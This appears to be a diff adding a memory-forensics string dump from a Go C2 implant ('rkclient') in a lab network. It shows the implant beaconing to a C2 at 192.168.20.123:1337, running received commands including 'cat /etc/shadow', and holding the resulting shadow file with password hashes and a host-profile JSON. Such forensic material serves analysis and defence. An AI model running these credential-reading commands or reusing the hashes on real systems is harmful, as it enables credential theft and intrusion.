+"                   heap                 heap                
+0xc000180840         0xc000194740         3          "who"                                                       heap                 heap                
+0xc0001808a0         0xc0001f2280         298        "x        tty1         2025-12-27 17:05
+x        pts/0        2025-12-27 17:05 (192.168.20.42)
+x        pts/1        2025-12-27 17:49 (192.168.20.42)
+x        pts/2        2025-12-27 16:55 (192.168.20.42)
+x        pts/3        2025-12-27 16:55 (192.168.20.42)
+x        pts/4        2025-12-27 17:05
+"heap                 heap                
+0xc0001809b0         0xc000194830         3          "cat"                                                       heap                 heap                
+0xc000180a10         0xc0002ac300         748        "root:$y$j9T$FLXb8uv9M83ZY/ROMEAL21$AdX.RJtCqn52jn6MClbtlAOcfHBugD3Hi..2J0wgBC2:20449:0:99999:7:::
+daemon:*:20449:0:99999:7:::
+bin:*:20449:0:99999:7:::
+sys:*:20449:0:99999:7:::
+sync:*:20449:0:99999:7:::
+games:*:20449:0:99999:7:::
+man:*:20449:0:99999:7:::
+lp:*:20449:0:99999:7:::
+mail:*:20449:0:99999:7:::
+news:*:20449:0:99999:7:::
+uucp:*:20449:0:99999:7:::
+proxy:*:20449:0:99999:7:::
+www-data:*:20449:0:99999:7:::
+backup:*:20449:0:99999:7:::
+list:*:20449:0:99999:7:::
+irc:*:20449:0:99999:7:::
+_apt:*:20449:0:99999:7:::
+nobody:*:20449:0:99999:7:::
+systemd-network:!*:20449::::::
+systemd-timesync:!*:20449::::::
+messagebus:!:20449::::::
+sshd:!:20449::::::
+x:$y$j9T$hLZyc/4FGGEXacpfi8lu5.$VzWbFGXN5AdS.WYGubMXbwibtDvrmQoi7fgNE8.O1K8:20449:0:99999:7:::
+"heap                 heap                
+0xc000200000         0x734765             2          "id"                                                        heap                 rodata              
+0xc00006a090         0x7347c7             2          "\\"                                                        heap                 rodata              
+0xc00006a0b0         0x7347c9             2          "\""                                                        heap                 rodata              
+0x9c1cf0             0xc0000a40d5         4          "root"                                                      heap                 heap                
+0x9c1d10             0xc0000a40d0         4          "root"                                                      heap                 heap                
+0xc0000a8168         0xc0000fa000         57         "2025/12/27 17:49:57 [+] Calling home to c2 to get cmd...
+" heap                 heap                
+0x9b5890             0x73bb47             24         "resource length too long"                                  heap                 rodata              
+0x9b58d0             0x742639             37         "too many Additionals to pack (>65535)"                     heap                 rodata              
+0x9b5500             0x74dddf             6704       "  ̈a ̄23 ́ ̧1o1⁄41⁄23⁄4i̇l·ʼnsdžⱥⱦhjrwy ̆ ̇ ̊ ̨ ̃ ̋lẍ́ ι; ̈́եւاٴوٴۇٴيٴक़ख़ग़ज़ड़ढ़फ़य़ড়ঢ়য়ਲ਼ਸ਼ਖ਼ਗ਼ਜ਼ਫ਼ଡ଼ଢ଼ําໍາຫນຫມགྷཌྷདྷབྷཛྷཀྵཱཱིུྲྀྲཱྀླྀླཱཱྀྀྒྷྜྷྡྷྦྷྫྷྐྵвдостъѣæbdeǝgikmnȣptuɐɑəɛɜŋɔɯvβγδφχρнɒcɕðfɟɡɥɨɩɪʝɭʟɱɰɲɳɴɵɸʂʃƫʉʊʋʌzʐʑʒθssάέήίόύώἀιἁιἂιἃιἄιἅιἆιἇιἠιἡιἢιἣιἤιἥιἦιἧιὠιὡιὢιὣιὤιὥιὦιὧιὰιαιάιᾶιι ̈͂ὴιηιήιῆι ̓̀ ̓́ ̓͂ΐ ̔̀ ̔́ ̔͂ΰ ̈̀`ὼιωιώιῶι′′′′′‵‵‵‵‵!!???!!?′′′′0456789+=()rsħnoqsmtmωåאבגדπ1⁄71⁄91⁄101⁄32⁄31⁄52⁄53⁄54⁄51⁄65⁄61⁄83⁄85⁄87⁄81⁄iiivviviiiixxi0⁄3∫∫∫∫∫∮∮∮∮∮1011121314151617181920(10)(11)(12)(13)(14)(15)(16)(17)(18)(19)(20)∫∫∫∫==⫝̸ɫɽȿɀ. ゙ ゚よりコト(ᄀ)(ᄂ)(ᄃ)(ᄅ)(ᄆ)(ᄇ)(ᄉ)(ᄋ)(ᄌ)(ᄎ)(ᄏ)(ᄐ)(ᄑ)(ᄒ)(가)(나)(다)(라)(마)(바)(사)(아)(자)(차)(카)(타)(파)(하)(주)(오전)(오후)(一)(二)(三)(四)(五)(六)(七)(八)(九)(十)(月)(火)(水)(木)(金)(土)(日)(株)(有)(社)(名)(特)(財)(祝)(労)(代)(呼)(学)(監)(企)(資)(協)(祭)(休)(自)(至)212223242526272829303132333435참고주의3637383940414243444546474849501月2月3月4月5月6月7月8月9月10月11月12月hgev令和アパートアルファアンペアアールイニングインチウォンエスクードエーカーオンスオームカイリカラットカロリーガロンガンマギガギニーキュリーギルダーキロキログラムキロメートルキロワットグラムグラムトンクルゼイロクローネケースコルナコーポサイクルサンチームシリングセンチセントダースデシドルトンナノノットハイツパーセントパーツバーレルピアストルピクルピコビルファラッドフィートブッシェルフランヘクタールペソペニヒヘルツペンスページベータポイントボルトホンポンドホールホーンマイクロマイルマッハマルクマンションミクロンミリミリバールメガメガトンメートルヤードヤールユアンリットルリラルピールーブルレムレントゲンワット0点1点2点3点4点5点6点7点8点9点10点11点12点13点14点15点16点17点18点19点20点21点22点23点24点daauovpcdmiu平成昭和大正明治株式会社panamakakbmbgbkcalpfnfmgkghzmldlklfmnmmmcmkmm2m3m∕sm∕s2rad∕srad∕s2psnsmspvnvmvkvpwnwmwkwbqcccdc∕kgdbgyhahpinkkktlmlnlxphprsrsvwbv∕ma∕m1日2日3日4日5日6日7日8日9日10日11日12日13日14日15日16日17日18日19日20日21日22日23日24日25日26日27日28日29日30日31日ьɦɬʞʇœʍ𤋮𢡊𢡄𣏕𥉉𥳐𧻓fffiflstմնմեմիվնմխיִײַעהכלםרתשׁשׂשּׁשּׂאַאָאּבּגּדּהּוּזּטּיּךּכּלּמּנּסּףּפּצּקּרּשּתּוֹבֿכֿפֿאלٱٻپڀٺٿٹڤڦڄڃچڇڍڌڎڈژڑکگڳڱںڻۀہھےۓڭۇۆۈۋۅۉېىئائەئوئۇئۆئۈئېئىیئجئحئمئيبجبحبخبمبىبيتجتحتختمتىتيثجثمثىثيجحجمحجحمخجخحخمسجسحسخسمصحصمضجضحضخضمطحطمظمعجعمغجغمفجفحفخفمفىفيقحقمقىقيكاكجكحكخكلكمكىكيلجلحلخلملىليمجمحمخمممىمينجنحنخنمنىنيهجهمهىهييجيحيخيميىييذٰرٰىٰ ٌّ ٍّ َّ ُّ ِّ ّٰئرئزئنبربزبنترتزتنثرثزثنمانرنزننيريزينئخئهبهتهصخلهنههٰيهثهسهشمشهـَّـُّـِّطىطيعىعيغىغيسىسيشىشيحىحيجىجيخىخيصىصيضىضيشجشحشخشرسرصرضراًتجمتحجتحمتخمتمجتمحتمخجمححميحمىسحجسجحسجىسمحسمجسممصححصممشحمشجيشمخشممضحىضخمطمحطممطميعجمعممعمىغممغميغمىفخمقمحقمملحملحيلحىلججلخملمحمحجمحممحيمجحمجممخجمخممجخهمجهممنحمنحىنجمنجىنمينمىيممبخيتجيتجىتخيتخىتميتمىجميجحىجمىسخىصحيشحيضحيلجيلمييحييجييميمميقمينحيعميكمينجحمخيلجمكممجحيحجيمجيفميبحيسخينجيصلےقلےاللهاكبرمحمدصلعمرسولعليهوسلمصلىصلى الله عليه وسلمجل جلالهریال,:!?_{}[]#&*-<>\$%@ـًـَـُـِـّـْءآأؤإئابةتثجحخدذرزسشصضطظعغفقكلمنهويلآلألإلا"'/^|~¢£¬¦¥ːˑʙɓʣꭦʥʤɖɗᶑɘɞʩɤɢɠʛʜɧʄʪʫꞎɮʎøɶɷɺɾʀʨʦꭧʧʈⱱʏʡʢʘǀǁǂ𝅗𝅥𝅘𝅥𝅘𝅥𝅮𝅘𝅥𝅯𝅘𝅥𝅰𝅘𝅥𝅱𝅘𝅥𝅲𝆹𝅥𝆺𝅥𝆹𝅥𝅮𝆺𝅥𝅮𝆹𝅥𝅯𝆺𝅥𝅯ıȷαεζηκλμνξοστυψ∇∂ϝабгежзиклмпруфхцчшыэюꚉәіјөүӏґѕџҫꙑұٮڡٯ0,1,2,3,4,5,6,7,8,9,(a)(b)(c)(d)(e)(f)(g)(h)(i)(j)(k)(l)(m)(n)(o)(p)(q)(r)(s)(t)(u)(v)(w)(x)(y)(z)〔s〕wzhvsdppvwcmcmdmrdjほかココサ手字双デ二多解天交映無料前後再新初終生販声吹演投捕一三遊左中右指走打禁空合満有月申割営配〔本〕〔三〕〔二〕〔安〕〔点〕〔打〕〔盗〕〔勝〕〔敗〕得可丽丸乁你侮侻倂偺備僧像㒞免兔兤具㒹內冗冤仌冬况凵刃㓟刻剆剷㔕勇勉勤勺包匆北卉卑博即卽卿灰及叟叫叱吆咞吸呈周咢哶唐啓啣善喙喫喳嗂圖嘆圗噑噴切壮城埴堍型堲報墬売壷夆夢奢姬娛娧姘婦㛮嬈嬾寃寘寧寳寿将尢㞁屠屮峀岍嵃嵮嵫嵼巡巢㠯巽帨帽幩㡢㡼庰庳庶廊廾舁弢㣇形彫㣣徚忍志忹悁㤺㤜悔惇慈慌慎慺憎憲憤憯懞懲懶成戛扝抱拔捐挽拼捨掃揤搢揅掩㨮摩摾撝摷㩬敏敬旣書晉㬙暑㬈㫤冒冕最暜肭䏙朗望朡杞杓㭉柺枅桒梅梎栟椔㮝楂榣槪檨櫛㰘次歔㱎歲殟殺殻汎沿泍汧洖派海流浩浸涅洴港湮㴳滋滇淹潮濆瀹瀞瀛㶖灊災灷炭煅熜爨爵牐犀犕獺王㺬玥㺸瑇瑜瑱璅瓊㼛甤甾異瘐㿼䀈直眞真睊䀹瞋䁆䂖硎碌磌䃣祖福秫䄯穀穊穏䈂篆築䈧糒䊠糨糣紀絣䌁緇縂繅䌴䍙罺羕翺者聠聰䏕育脃䐋脾媵舄辞䑫芑芋芝劳花芳芽苦若茝荣莭茣莽菧著荓菊菌菜䔫蓱蓳蔖蕤䕝䕡䕫虐虜虧虩蚩蚈蜎蛢蝹蜨蝫螆蟡蠁䗹衠衣裗裞䘵裺㒻䚾䛇誠諭變豕貫賁贛起跋趼跰軔輸邔郱鄑鄛鈸鋗鋘鉼鏹鐕開䦕閷䧦雃嶲霣䩮䩶韠䪲頋頩飢䬳餩馧駂駾䯎鬒鱀鳽䳎䳭鵧䳸麻䵖黹黾鼅鼏鼖鼻"heap                 rodata              
+0x9b54e0             0x73b437             23         "varint integer overflow"                                   heap                 rodata              
+0x9b55c0             0x73da88             28         "invalid path escape sequence"                              heap                 rodata              
+0x9b54d0             0x737747             14         "need more data"                                            heap                 rodata              
+0x9b54f0             0x7413eb             35         "hpack: invalid Huffman-encoded data"                       heap                 rodata              
+0x9b5530             0x739ee5             20         "header line too long"                                      heap                 rodata              
+0x9b55d0             0x737ced             15         "incomplete line"                                           heap                 rodata              
+0xc0001b00e0         0x73579c             9          "localtime"                                                 heap                 rodata              
+0x7ad3a0             0x7424a2             37         "out does not point to an integer type"                     heap                 rodata              
+0x7ac560             0x739995             20         "getCert can't be nil"                                      heap                 rodata              
+0x7acc30             0x735b95             9          "invalid n"                                                 heap                 rodata              
+0x6e6398             0x6e63c0             2          "T'"                                                        heap                 rodata              
+0x6e6498             0x6e64c0             2          "b("                                                        heap                 rodata              
+0x6ec098             0x6ec0c0             3          "iB"                                                        heap                 rodata              
+0x6e6d98             0x6e6dc0             2          "9'"                                                        heap                 rodata              
+0x6e6c98             0x6e6cc0             2          "iB"                                                        heap                 rodata              
+0x7ad890             0x73eab2             30         "reflect: Len of non-array type"                            heap                 rodata              
+0x7ac0e0             0x73673a             12         "can't happen"                                              heap                 rodata              
+0x7ac100             0x743aa9             41         "unexpected call to os.Exit(0) during test"                 heap                 rodata              
+0x7ac0c0             0x745436             45         "handleTransientRelease called in invalid mode"             heap                 rodata              
+0x7ac320             0x741eb5             37         "crypto: Size of unknown hash function"                     heap                 rodata              
+0x7ac580             0x73d3c0             28         "errors: target cannot be nil"                              heap                 rodata              
+0x7ad950             0x744ddb             43         "impl: package name must not contain slashes"               heap                 rodata              
+0x7ad960             0x741526             35         "chacha20: output smaller than input"                       heap                 rodata              
+0x7acca0             0x73e968             30         "MapIter.Key called before Next"                            heap                 rodata              
+0x7accd0             0x744629             42         "MapIter.Value called on exhausted iterator"                heap                 rodata              
+0x7acce0             0x74b12c             77         "MapIter.Next called on an iterator that does not have an associated map Value"heap                 rodata              
+0x7aab48             0x800171             85         "ng/json.isZero func(reflect.Value) bool; encoding/json.quoted bool; encoding/json.enc"heap                 rodata              
+0x7ad780             0x735c40             9          "underflow"                                                 heap                 rodata              
+0x7ac820             0x74352e             40         "ryuFtoaFixed32 called with negative prec"                  heap                 rodata              
+0x7adc48             0x73ee48             31         "PRIORITY frame with stream ID 0"                           heap                 rodata              
+0xc0001be098         0x6b2f05             4          "arch"                                                      heap                 rodata              
+0xc0001be0a8         0xc000194088         4          "arch"                                                      heap                 heap                
+0xc0001be140         0x6b2ef3             4          "name"                                                      heap                 rodata              
+0xc0001be1d8         0x6b7e51             3          "uid"                                                       heap                 rodata              
+0xc0001c2030         0xc000194075         5          ""os":"                                                     heap                 heap                
+0xc0001c20c8         0xc000194097         7          ""arch":"                                                   heap                 heap                
+0xc0001c2160         0xc0001940b7         7          ""name":"                                                   heap                 heap                
+0xc0001c21f8         0xc0001940d7         7          ""User":"                                                   heap                 heap                
+0xc0001c2290         0xc000194100         9          ""distro":"                                                 heap                 heap                
+0xc0001c2328         0xc000194130         9          ""kernel":"                                                 heap                 heap                
+0xc0001bc290         0xc000194148         4          "name"                                                      heap                 heap                
+0xc0001be0d0         0xc000194090         7          ""arch":"                                                   heap                 heap                
+0xc0001be200         0xc000194180         6          ""uid":"                                                    heap                 heap                
+0xc0001be210         0xc000194178         6          ""uid":"                                                    heap                 heap                
+0xc0001c0040         0xc000194070         5          ""os":"                                                     heap                 heap                
+0xc000004008         0x7348ec             3          "adx"                                                       heap                 rodata              
+0xc0001fe260         0xc00018e288         19         "192.168.20.123:1337"                                       heap                 heap                
+0x9bf280             0x735405             8          "tlsmlkem"                                                  heap                 rodata              
+0xc00018d080         0xc000188b20         29         "Sat, 27 Dec 2025 23:49:55 GMT"                             heap                 heap                
+0xc000192438         0xc0001a4c00         6          "whoami"                                                    heap                 heap                
+0xc0001fe2d8         0xc00018e348         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001fe3c0         0xc00018e408         19         "192.168.20.123:1337"                                       heap                 heap                
+0xc0001925d0         0xc0001a4e00         2          "id"                                                        heap                 heap                
+0xc000192888         0xc0001829a0         2          "0H"                                                        heap                 heap                
+0xc000192720         0xc0001a5000         3          "who"                                                       heap                 heap                
+0xc000192870         0xc0001a5200         15         "cat /etc/shadow"                                           heap                 heap                
+0xc000250028         0x73771d             14         "Accept-Charset"                                            heap                 rodata              
+0xc000250098         0x736def             13         "Accept-Ranges"                                             heap                 rodata              
+0xc000212168         0xc00025c000         11         "__sysinfo__"                                               heap                 heap                
+0xc000212180         0xc00023c080         57         "2025/12/27 17:50:06 [+] Calling home to c2 to get cmd...
+" heap                 heap                
+0xc0001260b8         0x738307             16         "www-authenticate"                                          heap                 rodata              
+0xc0001260f0         0x737cc0             15         "accept-language"                                           heap                 rodata              
+0xc00012a020         0x7362be             11         "/index.html"                                               heap                 rodata              
+0xc00007e428         0x73494b             4          "http"                                                      heap                 rodata              
+0xc0001400f0         0x73cdcc             27         "/memory/classes/total:bytes"                               heap                 rodata              
+0xc0001440f0         0xc0001384c0         49         "/godebug/non-default-behavior/tlsunsafeekm:events"         heap                 heap                
+0xc000182010         0x734769             2          "-d"                                                        heap                 rodata              
+0x9b8580             0x737277             14         "asynctimerchan"                                            heap                 rodata              
+0xc000198380         0xc000194618         5          "close"                                                     heap                 heap                
+0xc00018d550         0xc000188c00         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc000202010         0x734767             2          "-u"                                                        heap                 rodata              
+0xc0002560f0         0x7356bd             8          "Received"                                                  heap                 rodata              
+0xc0002021c8         0xc000262000         164        "{"os":"linux","arch":"amd64","name":"rkclient","User":{"name":"root","uid":"0","groups":"root"},"distro":"Debian GNU/Linux 12 (bookworm)","kernel":"6.1.0-41-amd64"}"heap                 heap                
+0xc000216540         0xc00020e3f0         5          "close"                                                     heap                 heap                
+0xc000216570         0xc00022aa60         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc0000b6090         0xc0000a4129         6          "200 OK"                                                    heap                 heap                
+0xc0000b60a8         0xc0000a4120         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0000b61b0         0xc0000a4349         6          "200 OK"                                                    heap                 heap                
+0xc0000b61c8         0xc0000a4340         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0001a02d0         0xc000194589         6          "200 OK"                                                    heap                 heap                
+0xc0001a02e8         0xc000194580         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0001fa588         0x7349ab             4          "Date"                                                      heap                 rodata              
+0xc0001a0510         0xc000194629         6          "200 OK"                                                    heap                 heap                
+0xc0001a0528         0xc000194620         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0001a0630         0xc000194659         6          "200 OK"                                                    heap                 heap                
+0xc0001a0648         0xc000194650         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0001a0870         0xc00019473a         6          "200 OK"                                                    heap                 heap                
+0xc0001a0888         0xc000194731         8          "HTTP/1.1"                                                  heap                 heap                
+0xc0001a0ab0         0xc000194829         6          "200 OK"                                                    heap                 heap                
+0xc0001a0ac8         0xc000194820         8          "HTTP/1.1"                                                  heap                 heap                
+0xc00021e090         0xc00020e0f9         6          "200 OK"                                                    heap                 heap                
+0xc00021e0a8         0xc00020e0f0         8          "HTTP/1.1"                                                  heap                 heap                
+0xc00021e240         0xc00020e3b9         6          "200 OK"                                                    heap                 heap                
+0xc00021e258         0xc00020e3b0         8          "HTTP/1.1"                                                  heap                 heap                
+0xc00021e360         0xc00020e3e9         6          "200 OK"                                                    heap                 heap                
+0xc00021e378         0xc00020e3e0         8          "HTTP/1.1"                                                  heap                 heap                
+0xc000002060         0x734aab             4          "fsrm"                                                      heap                 rodata              
+0xc0000020e0         0x734f11             6          "popcnt"                                                    heap                 rodata              
+0xc000002140         0x734cb1             5          "sse42"                                                     heap                 rodata              
+0xc0000ae0c0         0xc0000a40da         5          "close"                                                     heap                 heap                
+0xc0000ae0d0         0xc0000f4000         29         "Sat, 27 Dec 2025 23:49:44 GMT"                             heap                 heap                
+0xc0000ae0f0         0xc0000f4020         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc0000ae0e0         0xc0000a4130         2          "35"                                                        heap                 heap                
+0xc0000ae240         0xc0000a42fb         5          "close"                                                     heap                 heap                
+0xc0000ae250         0xc0000f46e0         29         "Sat, 27 Dec 2025 23:49:57 GMT"                             heap                 heap                
+0xc0000ae270         0xc0000f4700         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc0000ae260         0xc0000a4350         2          "26"                                                        heap                 heap                
+0xc000198390         0xc000188b60         29         "Sat, 27 Dec 2025 23:49:55 GMT"                             heap                 heap                
+0xc000216200         0xc000240200         164        "{"os":"linux","arch":"amd64","name":"rkclient","User":{"name":"root","uid":"0","groups":"root"},"distro":"Debian GNU/Linux 12 (bookworm)","kernel":"6.1.0-41-amd64"}"heap                 heap                
+0xc000216440         0xc00020e399         5          "close"                                                     heap                 heap                
+0xc000216450         0xc00022a9c0         29         "Sat, 27 Dec 2025 23:50:00 GMT"                             heap                 heap                
+0xc000216470         0xc00022a9e0         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc000216460         0xc00020e39e         2          "26"                                                        heap                 heap                
+0xc000216550         0xc00022aa40         29         "Sat, 27 Dec 2025 23:50:06 GMT"                             heap                 heap                
+0xc000216560         0xc00020e3f6         2          "26"                                                        heap                 heap                
+0xc000124080         0x734f65             6          "STREET"                                                    heap                 rodata              
+0xc000000020         0x7348e6             3          "aes"                                                       heap                 rodata              
+0xc000000040         0x734aa7             4          "erms"                                                      heap                 rodata              
+0xc000000080         0x735be6             9          "pclmulqdq"                                                 heap                 rodata              
+0xc0000000a0         0x734f0b             6          "rdtscp"                                                    heap                 rodata              
+0xc0000000c0         0x7348ef             3          "sha"                                                       heap                 rodata              
+0xc000118060         0x734fb3             6          "sha512"                                                    heap                 rodata              
+0x9bf5d0             0x7366bd             11         "archive/zip"                                               heap                 rodata              
+0x9bf550             0x7366b2             11         "crypto/x509"                                               heap                 rodata              
+0x9bf450             0x73615f             10         "crypto/tls"                                                heap                 rodata              
+0x9bf410             0x734801             2          "os"                                                        heap                 rodata              
+0x9bf390             0x735367             7          "runtime"                                                   heap                 rodata              
+0x9bf190             0x7366a7             11         "archive/tar"                                               heap                 rodata              
+0x9bf150             0x736155             10         "crypto/rsa"                                                heap                 rodata              
+0x9bf0d0             0x735c64             9          "math/rand"                                                 heap                 rodata              
+0x9bf010             0x73493a             3          "net"                                                       heap                 rodata              
+0x9beed0             0x735705             8          "go/build"                                                  heap                 rodata              
+0x9becd0             0x7356f5             8          "go/types"                                                  heap                 rodata              
+0x9beb10             0x734f95             6          "cmd/go"                                                    heap                 rodata              
+0x9bea90             0x7371e5             13         "crypto/subtle"                                             heap                 rodata              
+0xc00007cc00         0x737226             13         "#failfipscast"                                             heap                 rodata              
+0xc00007cc90         0x73570d             8          "#fips140"                                                  heap                 rodata              
+0xc00010e1e0         0x7361b9             10         "ClassCHAOS"                                                heap                 rodata              
+0xc00010e2b0         0x73907f             18         "RCodeServerFailure"                                        heap                 rodata              
+0xc00010e380         0x734fbf             6          "Answer"                                                    heap                 rodata              
+0xc00010e520         0x735bf8             9          "dns,files"                                                 heap                 rodata              
+0xc00010e930         0x734da3             6          "PADDED"                                                    heap                 rodata              
+0xc00010ed40         0x73a693             22         "MAX_CONCURRENT_STREAMS"                                    heap                 rodata              
+0xc00010efb0         0x73499f             4          "idle"                                                      heap                 rodata              
+0xc00007da80         0xc000014270         15         "/usr/sbin/uname"                                           heap                 heap                
+0x9b5690             0x739895             19         "file already closed"                                       heap                 rodata              
+0xc0000a2010         0xc00009e000         22         "/usr/local/sbin/whoami"                                    heap                 heap                
+0xc0000a2040         0xc00009e030         21         "/usr/local/bin/whoami"                                     heap                 heap                
+0xc0000a2070         0xc0000a4000         16         "/usr/sbin/whoami"                                          heap                 heap                
+0xc00018c010         0xc000188000         27         "/usr/local/sbin/lsb_release"                               heap                 heap                
+0xc00018c040         0xc000188040         26         "/usr/local/bin/lsb_release"                                heap                 heap                
+0xc00018c070         0xc00018e000         21         "/usr/sbin/lsb_release"                                     heap                 heap                
+0xc0001c02b0         0xc000194160         7          ""name":"                                                   heap                 heap                
+0xc0001c02c0         0xc000194158         7          ""name":"                                                   heap                 heap                
+0xc00018a418         0xc000194198         4          "NAME"                                                      heap                 heap                
+0xc00018a448         0xc0001941c0         6          "GROUPS"                                                    heap                 heap                
+0xc0001c03b8         0x6ba468             6          "groups"                                                    heap                 rodata              
+0xc0001c03e0         0xc0001941b0         9          ""groups":"                                                 heap                 heap                
+0xc0001c03f0         0xc0001941a0         9          ""groups":"                                                 heap                 heap                
+0xc0001c21d0         0x6a85b4             4          "User"                                                      heap                 rodata              
+0xc00018a5b8         0xc0001941c6         2          "OS"                                                        heap                 heap                
+0xc00018a5e8         0xc0001941cc         4          "NAME"                                                      heap                 heap                
+0xc0001c2300         0x6ba4a8             6          "kernel"                                                    heap                 rodata              
+0xc0001c2338         0xc000194120         9          ""kernel":"                                                 heap                 heap                
+0xc00018a618         0xc0001941d4         6          "DISTRO"                                                    heap                 heap                
+0xc0001c2170         0xc0001940b0         7          ""name":"                                                   heap                 heap                
+0xc0001c2208         0xc0001940d0         7          ""User":"                                                   heap                 heap                
+0xc0001c2268         0x6ba488             6          "distro"                                                    heap                 rodata              
+0xc0001c22a0         0xc0001940f0         9          ""distro":"                                                 heap                 heap                
+0xc00018c6c0         0xc0001a2800         1338       "-----BEGIN CERTIFICATE-----
+MIIDsDCCApigAwIBAgIUPISIYkvat4XVfPGhivqYuiFaiB8wDQYJKoZIhvcNAQEL
+BQAwaTELMAkGA1UEBhMCVVMxDzANBgNVBAgMBkhhd2FpaTETMBEGA1UEBwwKVGhl
+IFNld2VyczEYMBYGA1UECgwPUGFudGVnYW5hLCBJbmMuMRowGAYDVQQDDBFQYW50
+ZWdhbmEgUm9vdCBDQTAeFw0yNTEyMjcyMjM2MjRaFw0zNTEyMjUyMjM2MjRaMFsx
+CzAJBgNVBAYTAlVTMQ8wDQYDVQQIDAZIYXdhaWkxEzARBgNVBAcMClRoZSBTZXdl
+cnMxGDAWBgNVBAoMD1BhbnRlZ2FuYSwgSW5jLjEMMAoGA1UEAwwDYWJjMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxJB0RJl+M1nXhbcJ2aAnACvzKnED
+6zI70ElywiQfkbqUT9dH53D7dKeIyAhSlETwMAj/y81a5e4d++m9XXExVSk+ko7Y
+jfpgizWFjZwFpye9x2+UnwzwNNwNtGygKZPb5bmFpWbBSkg22Ai37KS5Ca8qitsY
+wrlmFIobUnPFzzlbFlzr0SmvR0ubRMYp5LsLw8bxQ3O90cHxws+0il9FCvfX5mlY
+f+0/2nmwCdRiVFjZNTtoSjM0YWvwqw4tbgnSTIuRlsdQnb3OoHQDrJrmRKxlPzW4
+LUD9/o9UIlYUpwCA1OtP9Mv9keDnsLfnbBj45XIFThkWl/CsugE26JBsawIDAQAB
+o14wXDAaBgNVHREEEzARgglsb2NhbGhvc3SHBMCoFHswHQYDVR0OBBYEFMrtrBpb
+THArAE5C+UbxEogrPGo7MB8GA1UdIwQYMBaAFFuYRjm1QIGL/DqLQiq6nL5xZXAg
+MA0GCSqGSIb3DQEBCwUAA4IBAQCnxOYxUTWifb6q1XVOFzfLrIXFmIOQKcS0IBq9
+/RHqKUzCpQbVJ3+04KCrIu4u9vupV72rseJmH5DK0UmOH+VJ5Vsm8szXrZv6wRO0
+4kTttr7zWd2zAisQ2kfodAOYEHY2LgBngSOwGR7TMDWej30PYhh1J2CkGyu1q9gI
+V2EKpM+uBkaGLcWLGR6urIoIeU28mZ9v+62hdgt0zr3szKUMSzWuprr3zOEVx2Gn
+mrBfbBnBnHrTEbOaSP4t92Lhpd4JTEyaLthBMqfOPoHaAIVA8ciMFopj0AWxoBJB
+b792ZO+4nRamWex2xtnJ0bOTe0QNCLEs1CO5wQFd8AdgNLu/
+-----END CERTIFICATE-----
+"heap                 heap                
+0xc000190050         0x738a19             18         "../cert/server.crt"                                        heap                 rodata              
+0xc00018c780         0xc000194280         11         "CERTIFICATE"                                               heap                 heap                
+0xc00018d0a0         0xc000188b40         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0xc00018d1b0         0xc00018e150         22         "/usr/local/sbin/whoami"                                    heap                 heap                
+0xc00018d1e0         0xc00018e180         21         "/usr/local/bin/whoami"                                     heap                 heap                
+0xc00018d210         0xc0001945a0         16         "/usr/sbin/whoami"                                          heap                 heap                
+0xc00018d690         0xc00018e240         17         "/usr/local/bin/id"                                         heap                 heap                
+0xc00018d6c0         0xc000194660         12         "/usr/sbin/id"                                              heap                 heap                
+0xc00018d920         0xc000188d20         29         "Sat, 27 Dec 2025 23:50:00 GMT"                             heap                 heap                
+0xc00018da50         0xc00018e2d0         19         "/usr/local/sbin/who"                                       heap                 heap                
+0xc00018da80         0xc00018e300         18         "/usr/local/bin/who"                                        heap                 heap                
+0xc00018dab0         0xc000194750         13         "/usr/sbin/who"                                             heap                 heap                
+0xc00018dd10         0xc000188e60         29         "Sat, 27 Dec 2025 23:50:06 GMT"                             heap                 heap                
+0xc00018dd20         0xc00019481a         2          "15"                                                        heap                 heap                
+0xc00018de40         0xc00018e390         19         "/usr/local/sbin/cat"                                       heap                 heap                
+0xc00018de70         0xc00018e3c0         18         "/usr/local/bin/cat"                                        heap                 heap                
+0xc00018dea0         0xc000194840         13         "/usr/sbin/cat"                                             heap                 heap                
+0xc00020c010         0xc000208000         18         "/usr/local/sbin/id"                                        heap                 heap                
+0xc00020c040         0xc000208030         17         "/usr/local/bin/id"                                         heap                 heap                
+0xc00020c070         0xc00020e000         12         "/usr/sbin/id"                                              heap                 heap                
+0xc00020c210         0xc00022a120         29         "Sat, 27 Dec 2025 23:49:44 GMT"                             heap                 heap                
+0xc00020c220         0xc00020e100         2          "11"                                                        heap                 heap                
+0xc00020c230         0xc00022a140         25         "text/plain; charset=utf-8"                                 heap                 heap                
+0x9b5310             0x73713c             13         "lame referral"                                             heap                 rodata              
+0x9b5350             0x739e31             20         "invalid DNS response"                                      heap                 rodata              
+0xc00011a180         0xc000014210         15         "/usr/bin/groups"                                           heap                 heap                
+0xc00011a300         0xc000014290         14         "/usr/bin/uname"                                            heap                 heap                
+0xc000092000         0xc0000a4010         15         "/usr/bin/whoami"                                           heap                 heap                
+0xc000184000         0xc00018e030         20         "/usr/bin/lsb_release"                                      heap                 heap                
+0xc000184180         0xc0001945b0         15         "/usr/bin/whoami"                                           heap                 heap                
+0xc000184300         0xc000194680         11         "/usr/bin/id"                                               heap                 heap                
+0xc000184480         0xc000194770         12         "/usr/bin/who"                                              heap                 heap                
+0xc000184600         0xc000194860         12         "/usr/bin/cat"                                              heap                 heap                
+0xc000204000         0xc00020e020         11         "/usr/bin/id"                                               heap                 heap                
+0xc000018090         0xc000020000         19         "TERM=xterm-256color"                                       heap                 heap                
+0xc0000180f0         0xc0000140a0         14         "_=./client.bin"                                            heap                 heap                
+0xc0001c01e0         0xc0001940c8         4          "User"                                                      heap                 heap                
+0xc0001c0330         0xc000194170         3          "uid"                                                       heap                 heap                
+0xc00010f388         0x734763             2          ".."                                                        heap                 rodata              
+0xc00010e758         0x7348fe             3          "udp"                                                       heap                 rodata              
+0xc00010e688         0x734f1d             6          "domain"                                                    heap                 rodata              
